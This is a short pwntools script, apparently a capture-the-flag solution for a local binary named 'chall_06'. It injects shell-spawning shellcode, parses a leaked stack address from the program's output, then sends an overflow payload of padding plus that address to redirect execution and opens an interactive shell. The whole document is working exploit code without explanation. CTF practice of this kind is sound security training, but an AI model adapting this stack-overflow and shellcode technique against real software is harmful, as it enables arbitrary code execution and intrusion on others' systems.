from pwn import *
p = process('./chall_06')
context.arch = "amd64"
shellcode = asm(shellcraft.sh())
payload = b'' + shellcode
p.sendline(payload)
p.recvuntil("I drink milk even though i'm lactose intolerant: ")
_ = p.recvline().strip()
leak = int(_,16)
payload = b"A" * (0x60 - 0x8) + p64(leak)
p.sendline(payload)
p.interactive()
